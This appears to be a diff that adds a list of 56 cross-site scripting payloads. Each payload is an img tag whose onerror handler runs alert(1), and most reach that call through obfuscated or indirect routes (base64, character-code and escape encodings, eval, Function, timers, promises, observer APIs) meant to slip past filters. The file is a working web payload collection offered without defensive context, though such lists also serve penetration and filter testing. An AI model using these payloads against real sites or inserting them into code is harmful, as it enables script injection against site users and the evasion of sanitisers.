@@ -1,0 +1,56 @@
+<img src=x onerror="setTimeout(alert.bind(null,1),500)">
+<img src=x onerror="setTimeout(() => alert(1), 1000)">
+<img src=x onerror="setTimeout('alert(1)', Math.random()*1000)">
+<img src=x onerror="setInterval(() => alert(1), 2000)">
+<img src=x onerror="requestAnimationFrame(alert.bind(null,1))">
+<img src=x onerror="queueMicrotask(() => alert(1))">
+<img src=x onerror="Promise.resolve().then(() => alert(1))">
+<img src=x onerror="eval('al'+'ert(1)')">
+<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
+<img src=x onerror="window['al'+'ert'](1)">
+<img src=x onerror="self['alert'](1)">
+<img src=x onerror="top['alert'](1)">
+<img src=x onerror="parent['alert'](1)">
+<img src=x onerror="globalThis['alert'](1)">
+<img src=x onerror="this['alert'](1)">
+<img src=x onerror="Function('alert(1)')()">
+<img src=x onerror="new Function('alert(1)')()">
+<img src=x onerror="(alert).call(null,1)">
+<img src=x onerror="(alert).apply(null,[1])">
+<img src=x onerror="setTimeout('a'+'lert(1)',500)">
+<img src=x onerror="setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),500)">
+<img src=x onerror="setTimeout(unescape('%61%6C%65%72%74(1)'),500)">
+<img src=x onerror="setTimeout(decodeURI('%61%6C%65%72%74(1)'),500)">
+<img src=x onerror="setTimeout('\x61\x6C\x65\x72\x74(1)',500)">
+<img src=x onerror="setTimeout('\141\154\145\162\164(1)',500)">
+<img src=x onerror="setTimeout('\u0061\u006C\u0065\u0072\u0074(1)',500)">
+<img src=x onerror="setTimeout(atob('YWxlcnQoMSk='),500)">
+<img src=x onerror="setTimeout(eval.bind(null,'alert(1)'),500)">
+<img src=x onerror="setTimeout(alert,500,1)">
+<img src=x onerror="setTimeout(alert,500,'1')">
+<img src=x onerror="setTimeout(alert.bind(null,'1'),500)">
+<img src=x onerror="setTimeout(alert.call,null,500,1)">
+<img src=x onerror="setTimeout(alert.apply,null,[1],500)">
+<img src=x onerror="requestAnimationFrame(() => alert(1))">
+<img src=x onerror="requestAnimationFrame(alert.bind(null,1))">
+<img src=x onerror="queueMicrotask(alert.bind(null,1))">
+<img src=x onerror="Promise.resolve(1).then(alert)">
+<img src=x onerror="Promise.resolve().then(() => alert(1))">
+<img src=x onerror="fetch('/').then(() => alert(1))">
+<img src=x onerror="navigator.sendBeacon('/', 'x') && alert(1)">
+<img src=x onerror="postMessage('x','*') && alert(1)">
+<img src=x onerror="history.pushState(0,0,'/?xss') && alert(1)">
+<img src=x onerror="location.hash='xss' && alert(1)">
+<img src=x onerror="document.cookie='test=xss'; alert(1)">
+<img src=x onerror="localStorage.setItem('xss','1'); alert(1)">
+<img src=x onerror="sessionStorage.setItem('xss','1'); alert(1)">
+<img src=x onerror="indexedDB.open('xss') && alert(1)">
+<img src=x onerror="WebSocket && new WebSocket('wss://x') && alert(1)">
+<img src=x onerror="MutationObserver && new MutationObserver(() => alert(1)).observe(document.body,{childList:true})">
+<img src=x onerror="ResizeObserver && new ResizeObserver(() => alert(1)).observe(document.body)">
+<img src=x onerror="IntersectionObserver && new IntersectionObserver(() => alert(1)).observe(document.body)">
+<img src=x onerror="PerformanceObserver && new PerformanceObserver(() => alert(1)).observe({entryTypes:['mark']})">
+<img src=x onerror="ReportingObserver && new ReportingObserver(() => alert(1)).observe()">
+<img src=x onerror="setTimeout(() => eval('alert(1)'),500)">
+<img src=x onerror="setTimeout(() => new Function('alert(1)')(),500)">
+<img src=x onerror="setTimeout(() => (0,eval)('alert(1)'),500)">
